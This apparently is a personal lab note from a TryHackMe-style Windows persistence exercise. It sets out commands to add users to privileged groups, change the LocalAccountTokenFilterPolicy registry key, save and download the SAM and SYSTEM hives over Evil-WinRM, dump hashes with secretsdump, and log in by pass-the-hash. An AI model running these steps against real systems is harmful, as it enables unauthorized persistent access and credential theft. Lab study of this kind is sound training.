Assign Group Memberships

We will assume you have dumped the password hashes of the victim machine


The direct way to make an unprivileged user gain administrative privileges is to make it part of the Administrators group. 

With the following command:
    -net localgroup administrators thmuser0 /add:
        This will allow you to access the server by using RDP, WinRM or any other remote administration service available.

If this looks too suspicious, you can use the Backup Operators group:
    This would allow us to copy the content of the SAM and SYSTEM registry hives, 
    which we can then use to recover the password hashes for all the users:

    We begin by adding the account to the Backup Operators group:
    -net localgroup "Backup Operators" thmuser1 /add

This is an unprivileged account, it cannot RDP or WinRM back to the machine unless we add it to the Remote Desktop Users (RDP) or Remote Management Users (WinRM) groups. 

We'll use WinRM for this task:
    -net localgroup "Remote Management Users" thmuser1 /add

In our Kali Terminal:
    -evil-winrm -i [TARGET IP] -u [USERNAME] -p [PASSWORD]
    IF We are using WinRM, We are confined to a limited access token with no administrative privileges.

    RESULT of the Evil-Winrm:
    In Windowds Session via RDP:
        ->whoami /groups == BUILTIN\Backup Operators Alias  S-1-5-32-551 Group used for deny only

        To be able to regain administration privileges from your user, 
        we'll have to disable LocalAccountTokenFilterPolicy by changing the following registry key to 1:
            
        in the Windows RDP Machine Terminal:
            -reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1

Once all of this has been set up, we are ready to use our backdoor:
    in Kali Evil-Winrm:
        -whoami /groups

        ->Result:
            BUILTIN\Backup Operators Alias S-1-5-32-551 Mandatory group, Enabled by default, Enabled group


We then proceed to make a backup of SAM and SYSTEM files and download them to our attacker machine:

    Evil-WinRM:
            -reg save hklm\system system.bak
            The operation completed successfully.

            -reg save hklm\sam sam.bak
            The operation completed successfully.

            -download system.bak
            Info: Download successful!

            -download sam.bak
            Info: Download successful!
Note: If Evil-WinRM takes too long to download the files, feel free to use any other transfer method.

With those files, we can dump the password hashes for all users using secretsdump.py or other similar tools:

Kali:
-python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL

Finnaly:

Perform Pass-the-Hash to connect to the victim machine with Administrator privileges:
    -Kali$ evil-winrm -i 10.10.241.98 -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3
